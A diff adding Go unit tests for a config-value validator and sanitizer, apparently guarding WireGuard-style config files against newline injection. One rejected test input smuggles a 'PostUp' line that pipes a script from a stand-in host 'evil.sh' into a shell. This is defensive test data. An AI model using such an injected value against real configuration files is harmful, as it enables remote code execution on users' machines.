@@ -211,3 +211,34 @@ func TestValidateSubnetIPv4RejectsMalformedOrInjectedValues(t *testing.T) {
 		}
 	}
 }
+
+func TestValidateConfigValueAcceptsPlausibleValues(t *testing.T) {
+	for _, v := range []string{"", "user@example.com", "MCPfRGcDGotJ6TcnIdDqsemj2cMIiGHnPUHM5ivXN18=", "<r 148>"} {
+		if err := ValidateConfigValue("email", v); err != nil {
+			t.Errorf("ValidateConfigValue(%q) rejected a plausible value: %v", v, err)
+		}
+	}
+}
+
+func TestValidateConfigValueRejectsControlCharacters(t *testing.T) {
+	cases := []string{
+		"a@x\nPostUp = curl evil.sh | sh",
+		"a@x\r\n[Interface]",
+		"tab\there",
+		"a@x\x7f",
+	}
+	for _, v := range cases {
+		if err := ValidateConfigValue("email", v); err == nil {
+			t.Errorf("ValidateConfigValue(%q) must be rejected", v)
+		}
+	}
+}
+
+func TestSanitizeConfigValueStripsControlCharactersOnly(t *testing.T) {
+	if got := sanitizeConfigValue("a@x\nPostUp = evil\r\n"); got != "a@xPostUp = evil" {
+		t.Errorf("sanitizeConfigValue must drop newlines/CR without altering the rest, got %q", got)
+	}
+	if got := sanitizeConfigValue("plain-value_123"); got != "plain-value_123" {
+		t.Errorf("sanitizeConfigValue must not touch an already-clean value, got %q", got)
+	}
+}
